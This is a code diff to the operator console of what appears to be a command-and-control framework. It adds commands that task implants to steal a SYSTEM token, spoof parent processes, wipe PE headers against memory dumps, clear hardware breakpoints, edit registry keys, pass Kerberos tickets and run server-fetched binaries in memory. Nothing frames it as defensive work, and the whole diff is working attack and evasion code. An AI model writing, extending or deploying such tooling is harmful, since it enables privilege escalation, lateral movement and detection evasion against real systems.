@@ -1340,6 +1340,23 @@ const HELP_TEXT = `Available commands:
   httpivot stop                  stop HTTP pivot
   winrm exec <t> <u> <p> <cmd>  execute via WinRM
   winrm deploy <t> <u> <p> <ps> deploy PS payload via WinRM
+── Privilege / OPSEC ────────────────────────────────────────
+  getsystem                      steal SYSTEM token (winlogon)
+  ppid <cmd> [parent]            spawn cmd spoofing PPID
+  hwbp-clear                     clear hardware breakpoints
+  wipe-mz                        zero MZ header (anti-dump)
+  config <json>                  update agent config at runtime
+── Registry ─────────────────────────────────────────────────
+  reg query <key>                query registry key
+  reg list <key>                 list registry key recursively
+  reg set <key> <name> <val>     set registry value (REG_SZ)
+  reg delete <key> [name]        delete registry key/value
+── Kerberos ─────────────────────────────────────────────────
+  kerb list                      list cached Kerberos tickets
+  kerb ptt <base64>              pass-the-ticket
+  kerb purge                     purge all tickets
+── PE execution ─────────────────────────────────────────────
+  exec-pe <binary.exe> [args]    load and run PE in-memory
 ── Ops ──────────────────────────────────────────────────────
   cleanup                        self-delete agent from disk
   kill                           terminate agent process
@@ -1560,6 +1577,52 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'httpivot': {
       taskType = args.startsWith('stop') ? 'HTTP_PIVOT_STOP' : 'HTTP_PIVOT_START';
       taskArgs = args.replace(/^start\s*/,'').replace(/^stop\s*/,'');
+      break;
+    }
+    case 'getsystem': taskType='GETSYSTEM'; break;
+    case 'hwbp-clear': taskType='HWBP_CLEAR'; break;
+    case 'wipe-mz': taskType='WIPE_MZ'; break;
+    case 'ppid': {
+      const [pcmd,...prest] = args.split(' ');
+      taskType='PPID';
+      taskArgs=JSON.stringify({cmd: pcmd||'cmd.exe', parent: prest[0]||'explorer.exe'});
+      break;
+    }
+    case 'config': {
+      taskType='CONFIG';
+      try { JSON.parse(args); taskArgs=args; }
+      catch { addConsoleOutput('usage: config {"sleep_sec":30,"jitter_pct":20,"working_hours":"09:00-17:00"}','',null); return; }
+      break;
+    }
+    case 'reg': {
+      const [rsub,...rrest] = args.split(' ');
+      if (rsub==='query')       { taskType='REG_QUERY';  taskArgs=rrest.join(' '); }
+      else if (rsub==='list')   { taskType='REG_LIST';   taskArgs=rrest.join(' '); }
+      else if (rsub==='set')    { taskType='REG_SET';    taskArgs=JSON.stringify({path:rrest[0],name:rrest[1],type:'REG_SZ',value:rrest.slice(2).join(' ')}); }
+      else if (rsub==='delete') { taskType='REG_DELETE'; taskArgs=JSON.stringify({path:rrest[0],name:rrest[1]||''}); }
+      else { addConsoleOutput('usage: reg <query|list|set|delete> <key> [name] [value]','',null); return; }
+      break;
+    }
+    case 'kerb': {
+      const [ksub,...krest] = args.split(' ');
+      if (ksub==='list')        { taskType='KERB_LIST'; }
+      else if (ksub==='ptt')    { taskType='KERB_PTT';   taskArgs=JSON.stringify({ticket:krest[0]||''}); }
+      else if (ksub==='purge')  { taskType='KERB_PURGE'; }
+      else { addConsoleOutput('usage: kerb <list|ptt <b64>|purge>','',null); return; }
+      break;
+    }
+    case 'exec-pe': {
+      const [efile,...erest] = args.split(' ');
+      if (!efile) { addConsoleOutput('usage: exec-pe <binary.exe> [args]','',null); return; }
+      addConsoleOutput(`[*] Fetching ${efile} from server…`,'',null);
+      try {
+        const fer = await fetch(`${BASE}/dl/${encodeURIComponent(efile)}`,{headers:{'Authorization':'Bearer '+TOKEN}});
+        if (!fer.ok) { addConsoleOutput('',`Cannot fetch ${efile}: ${fer.statusText}`,null); return; }
+        const pebytes = new Uint8Array(await fer.arrayBuffer());
+        payload = btoa(String.fromCharCode(...pebytes));
+        taskType='EXEC_PE';
+        taskArgs=JSON.stringify({args:erest.join(' ')});
+      } catch(e) { addConsoleOutput('','Fetch error: '+e.message,null); return; }
       break;
     }
     default:
